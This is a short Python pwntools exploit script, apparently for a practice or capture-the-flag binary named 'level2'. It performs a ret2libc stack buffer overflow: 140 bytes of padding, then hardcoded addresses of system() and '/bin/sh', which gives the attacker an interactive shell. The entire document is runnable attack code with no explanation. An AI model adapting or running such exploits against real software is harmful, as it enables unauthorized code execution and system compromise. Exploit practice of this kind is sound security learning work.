#!/usr/bin/env python
from pwn import *

p = process('./level2')
#p = remote('127.0.0.1',10002)
#gdb.attach(p)

ret = 0xdeadbeef
systemaddr=0xf7e4e3e0
binshaddr=0xf7f6f551

payload =  'A' * 140 + p32(systemaddr) + p32(ret) + p32(binshaddr)

p.send(payload)

p.interactive()



